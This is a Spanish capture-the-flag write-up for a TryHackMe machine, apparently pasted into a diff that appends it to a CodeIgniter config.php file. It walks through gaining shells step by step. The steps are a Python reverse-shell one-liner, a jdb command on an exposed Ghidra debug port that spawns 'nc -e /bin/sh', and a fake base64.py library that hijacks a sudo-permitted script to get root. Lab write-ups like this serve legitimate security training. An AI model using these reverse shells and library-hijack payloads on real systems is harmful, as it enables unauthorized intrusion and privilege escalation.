@@ -313,3 +313,182 @@ return array(
 );
 /* End of file config.php */
 /* Location: ./application/config/config.php */
+
+Tras un rato de seguir buscando en la máquina, consigo una nueva shell de python, ya que la que me proporciana el script de searchsploit no me deja moverme libremente.
+
+$ python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("192.168.131.65",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+
+sudo nc -lnvp 9001
+[sudo] contraseña para mksk:     
+Listening on 0.0.0.0 9001
+Connection received on 10.128.148.205 43840
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+
+Me muevo por el sistema y llego a /home/veronica
+
+En el directorio de Ghidra tengo permisos de escritura.
+No veo maneras de conseguir una shell como veronica o root por aquí.
+
+Veo la versión, para ver si tiene vulnerabilidades reconocidas.
+
+<n.version|application.release.name|application.build.date"                  
+application.version=9.0
+application.release.name=PUBLIC
+application.build.date=2019-Feb-28 1236 EST
+application.build.date.short=20190228
+
+
+Tiene varias vulnerabilidades reconocidas.
+
+Descartando vulnerabilidades que no puedo explotar, llego a una vulnerabilidad que permite abrir el puerto de depuración en modo debug. 
+
+//Se me ha apagado la máquina. He vuelto a ejecutar el script y ya.
+
+
+www-data@ubuntu:/var/www/html/limesurvey$ jdb -attach localhost:18001
+jdb -attach localhost:18001
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+> stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+Set breakpoint org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()
+> new java.lang.Runtime().exec("nc 192.168.131.65 900                      
+Breakpoint hit: "thread=Log4j2-TF-4-Scheduled-1", org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run(), line=96 bci=0
+
+Log4j2-TF-4-Scheduled-1[1] 5 print new java.lang.Runtime().exec("nc 192.168.131.65 9005 -e /bin/sh")
+Unrecognized command: 'new'.  Try help...
+Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec("nc 192.168.131.65 9005 -e /bin/sh")
+ new java.lang.Runtime().exec("nc 192.168.131.65 9005 -e /bin/sh") = "Process[pid=3394, exitValue="not exited"]"
+Log4j2-TF-4-Scheduled-1[1] 
+
+
+Consigo una nueva conexion, esta vez como verónica.
+
+nc -lnvp 9005
+Listening on 0.0.0.0 9005
+Connection received on 10.128.162.63 50324
+whoami
+veronica
+
+En el /home de verónica encuentro la flag de user.
+
+veronica
+ls
+base.py
+Desktop
+Documents
+Downloads
+examples.desktop
+ghidra_9.0
+Music
+Pictures
+Public
+__pycache__
+Templates
+user.txt
+Videos
+cat user.txt
+THM{EB***********************************************************}
+
+Me muevo a otra shell para moverme más comodamente y busco la respuesta a la segunda pregunta.
+
+What is the login path for the wordpress installation?
+
+Connection received on 10.128.162.63 35482
+bash: cannot set terminal process group (1334): Inappropriate ioctl for device
+bash: no job control in this shell
+veronica@ubuntu:/var/www/html$ ls
+ls
+index.html
+limesurvey
+wordpress
+veronica@ubuntu:/var/www/html$ cd wordpress
+cd wordpress
+bash: cd: wordpress: Permission denied
+veronica@ubuntu:/var/www/html$ ls
+ls
+index.html
+limesurvey
+wordpress
+veronica@ubuntu:/var/www/html$ 
+
+No puedo acceder al .htaccess asique continuo.
+
+cat base.py
+import base64
+
+hijackme = base64.b64encode(b'tryhackme is the best')
+print(hijackme)
+
+Veo el script que hay en el escritorio.
+
+Y al hacer un sudo -l puedo ver que puedo ejecutar el script como root.
+
+sudo -l
+Matching Defaults entries for veronica on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User veronica may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+    (root : root) NOPASSWD: /usr/bin/python3.5 /home/veronica/base.py
+
+
+Creo base64.py (la libreria falsa).
+
+
+cat base64.py
+import sys
+import importlib
+import socket
+import pty
+import os
+
+# Guardar referencia al módulo real
+_real_base64 = importlib.import_module('base64')
+
+# Nuestra shell reversa se ejecuta al importar
+lhost = "192.168.131.65"
+lport = 9001
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((lhost, lport))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+    os.putenv("HISTFILE", '/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+except:
+    pass
+
+# Exportar todo del base64 real para que el script funcione
+for attr in dir(_real_base64):
+    if not attr.startswith('_'):
+        globals()[attr] = getattr(_real_base64, attr)
+
+# La función b64encode original para que no falle
+def b64encode(data):
+    return _real_base64.b64encode(data)
+
+Lo ejecuto.
+
+Y consigo una revshell como root.
+
+sudo nc -lnvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.128.162.63 57418
+root@ubuntu:~# 
+
+Consigo la flag de root.
+
+root@ubuntu:/root# cat root.txt
+cat root.txt
+THM{02E***************************************************}
+
+En los archivos de wordpress he buscado un poco sin éxito.
+
+He llegado a la página de wordpress en 443, y he clicado en log in.
+https://10.128.162.63/?d*********
